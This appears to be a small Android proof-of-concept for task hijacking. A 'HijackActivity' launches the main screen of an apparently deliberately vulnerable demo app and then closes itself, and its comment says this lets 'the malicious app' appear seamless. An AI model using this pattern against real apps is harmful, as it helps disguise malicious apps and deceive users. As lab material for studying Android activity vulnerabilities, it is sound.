package com.example.taskhijackingapp;

import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class HijackActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Launch the vulnerable app's MainActivity
        Intent intent = new Intent();
        intent.setClassName("com.example.intetn_redirect_vuln", "com.example.intetn_redirect_vuln.MainActivity");
        startActivity(intent);
        finish(); // Close the malicious app to make it look seamless
    }
}